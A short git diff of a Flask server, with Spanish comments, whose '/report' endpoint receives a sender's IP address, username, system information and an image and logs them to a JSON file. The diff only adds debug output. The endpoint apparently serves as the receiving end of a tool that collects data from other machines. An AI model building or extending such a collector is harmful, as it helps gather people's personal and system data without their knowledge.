@@ -10,6 +10,11 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 @app.route("/report", methods=["POST"])
 def report():
+    # Mostrar todo lo recibido en crudo para debug
+    print("\n📥 Datos crudos recibidos:")
+    print("FORM:", request.form)
+    print("FILES:", request.files)
+
     ip = request.form.get("ip", "No recibido")
     username = request.form.get("username", "No recibido")
     system_info = request.form.get("system_info", "No recibido")
@@ -25,6 +30,8 @@ def report():
     if image:
         filename = datetime.now().strftime("%Y%m%d%H%M%S") + ".jpg"
         image.save(os.path.join(UPLOAD_FOLDER, filename))
+    else:
+        print("[!] No se recibió imagen")
 
     reporte = {
         "ip": ip,
@@ -39,9 +46,10 @@ def report():
         "imagen": filename
     }
 
-    print("✅ Nuevo reporte recibido:")
+    print("✅ Reporte interpretado:")
     print(json.dumps(reporte, indent=2))
 
+    # Guardar
     if not os.path.exists("reportes.json"):
         with open("reportes.json", "w") as f:
             json.dump([], f)
@@ -52,7 +60,7 @@ def report():
     with open("reportes.json", "w") as f:
         json.dump(datos, f, indent=2)
 
-    return "Reporte recibido"
+    return "Reporte recibido correctamente"
 
 @app.route("/")
 def index():
